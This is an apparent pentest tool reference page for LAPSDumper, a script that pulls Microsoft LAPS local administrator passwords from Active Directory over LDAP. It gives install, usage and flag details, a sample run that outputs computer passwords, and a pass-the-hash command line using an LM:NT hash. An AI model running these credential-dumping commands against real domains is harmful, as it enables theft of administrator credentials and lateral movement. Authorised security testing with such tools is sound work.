---
title : "LAPSdumper"
# pre : ' '
description : "Dump LAPS Passwords."
date : 2020-12-21T14:32:07+01:00
# hidden : true
# draft : true
weight : 990
tags : ['Other', 'LDAP', 'Active Directory']
---

---

Dump LAPS (Microsoft Local Administrator Password Solution) Passwords.

## Installation

```plain
git clone https://github.com/n00py/LAPSDumper
```

## Usage

```plain
laps.py [-h] -u USERNAME -p PASSWORD [-l LDAPSERVER] -d DOMAIN
```

## Flags

```plain
optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        username for LDAP
  -p PASSWORD, --password PASSWORD
                        password for LDAP (or LM:NT hash)
  -l LDAPSERVER, --ldapserver LDAPSERVER
                        LDAP server (or domain)
  -d DOMAIN, --domain DOMAIN
                        Domain
```

## Examples

```plain
$ python3 laps.py -u user -p password -d domain.local

COMPUTER01$:B#g4%aI$K!yZ)q}
COMPUTER02$:n-6pW-n8L!o8Of]
COMPUTER03$:u2Oc9z&{R)fHA2J
COMPUTER04$:Rwb2#4,{@N4Y19v
COMPUTER05$:17aZ,+1L5L((D0F
COMPUTER06$:DNX&@e.8XTQhyPj
COMPUTER07$:U3ZXf0vX!Xm1P89
COMPUTER08$:.6IvTd7-85ytJeF
COMPUTER09$:P2(VSN4%49!%fI8
```

### Pass-the-Hash specific LDAP server

```plain
python3 laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
```

## URL List

- [GitHub.com - LAPSDumper](https://github.com/n00py/LAPSDumper)
- [n00py.io - Dumping LAPS passwords from Linux](https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/)
- [ADSecurity.org - Microsoft Local Administrator Password Solution (LAPS)](https://adsecurity.org/?p=1790)
- [ADSecurity.org - Microsoft LAPS Security & Active Directory LAPS Configuration Recon](https://adsecurity.org/?p=3164)
